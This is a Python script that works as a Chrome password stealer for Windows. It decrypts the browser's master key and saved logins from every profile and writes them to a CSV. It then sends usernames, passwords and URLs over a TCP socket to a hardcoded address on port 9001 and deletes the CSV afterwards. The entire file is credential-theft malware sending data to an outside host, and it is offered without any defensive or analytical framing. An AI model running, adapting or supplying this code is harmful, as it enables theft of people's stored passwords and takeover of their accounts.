import os
import socket
import pandas as pd
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv
import time

CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % os.environ['USERPROFILE'])
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % os.environ['USERPROFILE'])

def get_secret_key():
    try:
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = json.loads(f.read())
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"[ERR] Chrome secret key cannot be found: {e}")
        return None

def decrypt_password(ciphertext, secret_key):
    try:
        iv = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = AES.new(secret_key, AES.MODE_GCM, iv)
        return cipher.decrypt(encrypted_password).decode()
    except Exception as e:
        print(f"[ERR] Unable to decrypt password: {e}")
        return ""

def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print(f"[ERR] Chrome database cannot be found: {e}")
        return None

def extract_chrome_passwords():
    with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as f:
        csv_writer = csv.writer(f, delimiter=',')
        csv_writer.writerow(["index", "url", "username", "password"])
        secret_key = get_secret_key()
        folders = [e for e in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", e)]
        for folder in folders:
            chrome_path_login_db = os.path.normpath(rf"{CHROME_PATH}\{folder}\Login Data")
            conn = get_db_connection(chrome_path_login_db)
            if secret_key and conn:
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for index, login in enumerate(cursor.fetchall()):
                    url, username, ciphertext = login
                    if url and username and ciphertext:
                        password = decrypt_password(ciphertext, secret_key)
                        csv_writer.writerow([index, url, username, password])
                cursor.close()
                conn.close()
                os.remove("Loginvault.db")

def get_usernames_and_passwords(file):
    data = pd.read_csv(file)
    return data["username"].tolist(), data["password"].tolist(), data["url"].tolist()

def transmit_passwords(user_list, pass_list, url_list, ip_addr="172.29.138.13", port=9001):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip_addr, port))
        to_be_sent = "\n".join([f"{user}: {password} :{url}" for user, password, url in zip(user_list, pass_list, url_list)])
        s.sendall(to_be_sent.encode("utf-8"))

def delete_csv(file):
    if os.path.exists(file):
        os.remove(file)

if __name__ == '__main__':
    extract_chrome_passwords()
    user_list, pass_list, url_list = get_usernames_and_passwords("decrypted_password.csv")
    transmit_passwords(user_list, pass_list, url_list)
    delete_csv("decrypted_password.csv")
